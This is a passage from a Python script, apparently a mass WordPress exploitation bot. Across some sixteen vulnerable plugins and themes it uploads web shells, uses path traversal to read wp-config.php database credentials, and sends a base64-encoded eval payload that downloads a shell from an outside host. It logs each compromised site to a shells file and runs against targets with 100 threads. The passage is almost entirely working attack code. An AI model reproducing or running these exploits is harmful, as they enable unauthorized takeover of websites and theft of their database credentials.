		flipbookreq = requests.post(url+'/wp-content/plugins/flipbook/php.php', files=flipbookup)
		
		flipbooklib = requests.get(url+'/wp-includes/fb-images/'+filenames)
		
		
		if 'izocin' in flipbooklib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} flipbook     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-includes/fb-images/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} flipbook    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 32 . flipbook
		
		wpstoreup = {'Filedata':(filenames, shell, 'text/html')}
		
		wpstorereq = requests.post(url+'/wp-content/plugins/wpstorecart/php/upload.php', files=wpstoreup)
		
		wpstorelib = requests.get(url+'/wp-content/uploads/wpstorecart/'+filenames)
		
		
		if 'izocin' in wpstorelib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpstorecart     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/wpstorecart/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpstorecart    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 33 . dance
		
		danceup = {'file':(filenames, shell, 'text/html')}
		
		dancereq = requests.post(url+'/wp-content/themes/dance-studio/core/libs/imperavi/tests/file_upload.php', files=danceup)
		
		dancelib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'izocin' in dancelib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} dance-studio     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} dance-studio    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 34 . design
		
		designup = {'Filedata':(filenames, shell, 'text/html')}
		
		designreq = requests.post(url+'/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php', files=designup)
		
		designlib = requests.get(url+'/wp-content/themes/u-design/scripts/admin/uploadify/'+filenames)
		
		
		if 'izocin' in designlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} u-design     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/u-design/scripts/admin/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} u-design    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 35 . wpshop
		
		wpshopup = {'wpshop_file':(filenames, shell, 'text/html')}
		
		wpshopreq = requests.post(url+'/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload', files=wpshopup)
		
		wpshoplib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'izocin' in wpshoplib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpshop     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpshop    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 36 . symposium
		
		symposiumup = {'fileToUpload':(filenames, shell, 'text/html')}
		
		symposiumreq = requests.post(url+'/wp-content/plugins/wp-symposium/js/uploadify/uploadify.php', files=symposiumup)
		
		symposiumlib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'izocin' in symposiumlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-symposium     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-symposium    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 37 . formcraft
		
		formcraftup = {'files[]':(filenames, shell, 'text/html')}
		
		formcraftreq = requests.post(url+'/wp-content/plugins/formcraft/file-upload/server/php/', files=formcraftup)
		
		formcraftlib = requests.get(url+'/wp-content/plugins/formcraft/file-upload/server/php/files/'+filenames)
		
		
		if 'izocin' in formcraftlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} formcraft     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/formcraft/file-upload/server/php/files/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} formcraft    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 38 . pica
		
		picaup = {'uploadfile':(filenames, shell, 'text/html')}
		
		picareq = requests.post(url+'/wp-content/plugins/pica-photo-gallery/picaPhotosResize.php', files=picaup)
		
		picalib = requests.get(url+'/wp-content/uploads/pica-photo-gallery/'+filenames)
		
		
		if 'izocin' in picalib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} pica-photo-gallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/pica-photo-gallery/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} pica-photo-gallery    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


		# 39 . contact-form			
			
		conta = {'action': 'nm_webcontact_upload_file'}
		
		isabo = {'Filedata': (filenames, shell, 'text/html')}

		sonzsreq = requests.post(url+'/wp-admin/admin-ajax.php', data=conta, files=isabo)

		
		
		sonzslib = requests.get(url+'/wp-content/uploads/contact_files/'+filenames)
		
		
		if 'izocin' in sonzslib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} N-media contact     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/contact_files/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} N-media contact    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		# 40 . conf
		
		conflib = requests.get(url+"/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php")
				
		if 'DB_USER' in conflib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} membership-simplified     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php'+'\n')
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} membership-simplified     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		# 41 . confr
		
		confrlib = requests.get(url+"/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php")
				
		if 'DB_USER' in confrlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-ecommerce-shop-styling     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php'+'\n')
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-ecommerce-shop-styling     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


		# 42 . copysafe
			
		contax = {'upload_path': '../../../../uploads/'}
		
		isabox = {'wpcsp_file': (filenames, shell, 'text/html')}

		sonzsxreq = requests.post(url+'/wp-content/plugins/wp-copysafe-pdf/lib/uploadify/uploadify.php', data=contax, files=isabox)

		
		
		sonzsxlib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'izocin' in sonzsxlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-copysafe-pdf     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-copysafe-pdf    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 43 . wallimport		

		sonzsdreq = requests.post(url+'/wp-admin/admin-ajax.php?page=pmxi-admin-settings&action=upload&name=izo.php', data=shell)
		
		path_dir = os.popen('php -r "print md5(\''+str(path)+'\');"').read()

		
		
		sonzsdlib = requests.get(url+"/wp-content/uploads/wpallimport/uploads/"+str(path_dir)+"/izo.php")
		
		
		if 'izocin' in sonzsdlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpallimport     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/wpallimport/uploads/'+path_dir+'/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpallimport    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 44 . woocommerce
		
		
		izfreq = requests.post(url+'/produits/?items_per_page=%24%7b%40eval(base64_decode(cGFzc3RocnUoJ2NkIHdwLWNvbnRlbnQvdXBsb2Fkcy8yMDE4LzAxO3dnZXQgaHR0cDovL3d3dy5hd3RjLmFpZHQuZWR1Ly9jb21wb25lbnRzL2NvbV9iMmpjb250YWN0L3VwbG9hZHMvdHh0LnR4dDttdiB0eHQudHh0IGl6b20ucGhwJyk7))%7d&setListingType=grid')
		
		izflib = requests.get(url+'/wp-content/uploads/2018/01/izom.php')
		
		
		if 'izocin' in izflib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce produits     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/01/izom.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce produits    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		
		# 45 . Cherry
		
		acfup = {'files':(filenames, shell, 'text/html')}
		
		acfreq = requests.post(url+'/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php/', files=acfup)
		
		acflib = requests.get(url+'/wp-content/uploads/uigen_2018/'+filenames)
		
		
		if 'izocin' in acflib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} acf-frontend-display     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/uigen_2018/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} acf-frontend-display    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)		

			
		# 46 . copysafe
			
		appgravs  = {'name':'izo.php'}
		
		
		Gravs = {'file':(filename, shell, 'text/html')}

		sonzsxyreq = requests.post(url+'/wp-content/themes/konzept/includes/uploadify/upload.php', data=appgravs, files=Gravs)	
		
		sonzsxylib = requests.get(url+'/wp-content/themes/konzept/includes/uploadify/izo.php')
		
		
		if 'izocin' in sonzsxylib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} konzept     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/konzept/includes/uploadify/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} konzept    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

		
		# 47 . Cherry
		
		acfxup = {'Filedata':(filenames, shell, 'text/html')}
		
		acfxreq = requests.post(url+'/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php', files=acfxup)
		
		acfxlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames)
		
		
		if 'izocin' in acfxlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} RightNow     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} RightNow    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


			
    except:
        pass		
		
banners()

	
def Main():
    try:
		
        start = timer()
        ThreadPool = Pool(100)
        Threads = ThreadPool.map(wpbot, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()
